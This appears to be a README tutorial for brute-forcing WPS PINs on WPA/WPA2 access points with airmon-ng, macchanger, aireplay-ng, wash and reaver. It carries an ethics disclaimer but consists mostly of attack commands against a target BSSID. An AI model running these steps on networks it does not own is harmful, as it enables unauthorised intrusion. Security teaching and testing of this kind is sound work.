# WPS WPA/WPA2 Brute Force Attack with Reaver

Simulation demonstrates step-by-step method for attempting to brute force WPA/WPA2- protected access point
exploiting WPS vulnerabilities and retrieving 8 digit key

# Project is for education and ethical testing within your own devices.

## Tools Used
  -  *airmon-ng*  -enables monitor mode
  -  *aireplay-ng* - used for fake authentication
  -  *wash* -scans for WPS-enabled access points
  -  *reaver* - brute-force tools for WPS PIN

## Setup & Attack

1. Confirm and Enable Wireless Adapter
   -sudo iwconfig

2. Prepare Monitor mode
   - sudo ifconfig wlan0 down
   - sudo macchanger -r wlan0
   - sudo airmon-ng check kill
   - sudo airmon-ng start wlan0

3. Search for WPS access points
   - sudo wash --interface wlan0

4. Locate WPS access point (Locked:NO) and enter information for Fake Authentication
   - sudo aireplay-ng --fakeauth 30 -a <Target_BSSID> -h <Your_MAC> wlan0

5. DO NOT RUN COMMAND YET until following command (horizontal) entered below
   - sudo reaver --bssid <Target_BSSDI> --channel <Target_Channel> --interface <your network wlan0> -vvv --no-associate
